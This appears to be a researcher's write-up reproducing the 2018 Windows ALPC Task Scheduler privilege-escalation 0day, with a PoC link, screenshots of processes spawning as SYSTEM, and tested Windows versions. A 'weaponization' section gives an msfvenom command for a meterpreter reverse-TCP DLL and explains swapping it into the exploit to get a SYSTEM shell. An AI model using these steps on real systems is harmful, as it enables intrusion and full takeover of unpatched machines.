# ALPC bug 0day

[https://github.com/SandboxEscaper/randomrepo/blob/master/PoC-LPE.rar](https://github.com/SandboxEscaper/randomrepo/blob/master/PoC-LPE.rar)

{% embed url="https://www.theregister.co.uk/2018/08/28/windows\_0day\_pops\_up\_out\_of\_span\_classstrikenowherespan\_twitter/" caption="" %}

## How to use

A 0day for a local priv esc for Windows was published August 28th on Twitter by @sandboxescaper, whose account was pulled quickly. The PoC is on [Github](https://github.com/SandboxEscaper/randomrepo). The video posted with the PoC wasn't evident so I made a quick reproduction to verify whether it works, and it certainly does.

* As Administrator, open [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) - right click, "Run as administrator"
* As a regular user, launch notepad. If you opened it from cmd, you get a subprocess notepad inside cmd. This thread runs with the user context you launched it with. Note that the PID of the notepad process is `3872`

![](../.gitbook/assets/image-18.png)

![](../.gitbook/assets/image-30.png)

* If you need to see username and  integrity level in Process Explorer you can go to View -&gt; Select columns and check 

![](../.gitbook/assets/image-38.png)

Now, have a look at the process spoolsv.exe which is basically where the actions is going to happen. Nothing much here yet.

![](../.gitbook/assets/image-46.png)

Now fire the exploit off and see what happens \(this is demonstrated in the PoC video\). We use the PID of the notepad process we spawned earlier `3872`

![](../.gitbook/assets/image-6.png)

Now, it appears that nothing is happening, but take a look at spoolsv in Process Explorer again.

![](../.gitbook/assets/image-5.png)

Bham! cmd.exe with subprocesses conhost and notepad has spawned as SYSTEM!

### Windows 10 - works!

0day priv esc confirmed on Windows 10 1803. No patch has been released by MS yet \(28.08.2018\)

![](../.gitbook/assets/image-10.png)

This could probably be tweaked to open an actual cmd window as SYSTEM instead of a windowless process in the background.

Edit on the above: @plaintext notified me that the processes spawn in session 0 which is why they won't be visible to the user which operations in session 1. If you toggle Session in the columns panel in ProcExplorer you can see that very clearly.

![](../.gitbook/assets/image-17.png)

### Server 2016 - works

![](../.gitbook/assets/image-40.png)

### Windows 7 - Nothing happens

![](../.gitbook/assets/image-48.png)

\*\*\*\*

### Weaponization maybe?

After reading the source code I discovered that notepad is launched from the `exploit.dll` added as a Resource. This can be seen at line 101-105 in the source code.

```text
//Payload is included as a resource, you need to modify this resource accordingly.
HRSRC myResource = ::FindResource(mod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
unsigned int myResourceSize = ::SizeofResource(mod, myResource);
HGLOBAL myResourceData = ::LoadResource(mod, myResource);
void* pMyBinaryData = ::LockResource(myResourceData);
```

When clicking that one, we can see this exploit.dll which in the PoC just spawns notepad can't be read since I don't have it in that absolute path.

![](../.gitbook/assets/image-37.png)

So instead of recompiling and fixing the 500 errors I got from visual studio I decided it was easier to replace the dll directly as a Resource with [CFF Explorer](https://ntcore.com/?page_id=388)'. But before I did that I had to prepare the payload.

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.16 lport=444 -f dll -o lol.dll`

Select "Replace Resource \(raw\)" in CFF Explorer and provide the `lol.dll`. Then save the `ALPC-TaskSched-LPE.dll` as a new file. The entire exploit is now embedded into the dll file

![](../.gitbook/assets/image-55.png)

So we fire of the exploit again, just like we did above and wait for our shell to come back.

Woop de doo we got a SYSTEM meterpreter.

![](../.gitbook/assets/image-28.png)

